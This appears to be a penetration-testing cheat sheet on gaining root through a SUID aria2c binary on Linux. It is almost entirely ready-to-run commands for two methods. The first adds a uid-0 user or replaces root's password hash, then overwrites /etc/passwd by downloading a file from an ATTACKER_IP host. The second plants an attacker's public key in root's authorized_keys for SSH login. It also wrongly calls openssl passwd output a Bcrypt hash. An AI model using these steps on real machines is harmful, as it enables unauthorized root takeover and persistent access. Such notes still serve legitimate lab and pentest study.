# Aria2c Privilege Escalation

Link: https://gtfobins.github.io/gtfobins/aria2c/

## SUID Bit

Here, we will try to overwrite the passwd file, or add our public key to target machine to authenticate as root as an alternate method.

## Passwd file overwrite

### 1) Copy target passwd on your machine

    cat /etc/passwd (Target)

### 2) You can either modify root's password, or add an arbitrary user with root privileges. Either works fine.

Generate a password hashed in Bcrypt

    openssl passwd PASSWORD

Then you can add an arbitrary user inside the passwd file

    pwned:HASH_FROM_OPENSSL_COMMAND:0:0:root:/root:/bin/bash

OR change root's password (Replace the x with your generated hash from openssl command)

    root:HASH_FROM_OPENSSL_COMMAND:0:0:root:/root:/bin/bash

### 3) Overwrite the original /etc/passwd in the target machine with our modified one (You must be in the / directory for it to work)

    /usr/bin/aria2c -o /etc/passwd "http://ATTACKER_IP/passwd" --allow-overwrite=true

### 4) Authenticate either as root or your user

    su root
    su pwned

## SSH session as root

### 1) Go to your .ssh folder where your key pair is located

    cd ~/.ssh/

### 2) Transfer the public key to root authorized_keys to allow you to authenticate as root via SSH using your private key (You must be in the / directory for it to work)

    /usr/bin/aria2c -d /root/.ssh/ -o authorized_keys "http://ATTACKER_IP/id_rsa.pub" --allow-overwrite=true

### 3) SSH as root to target machine

    ssh root@IP
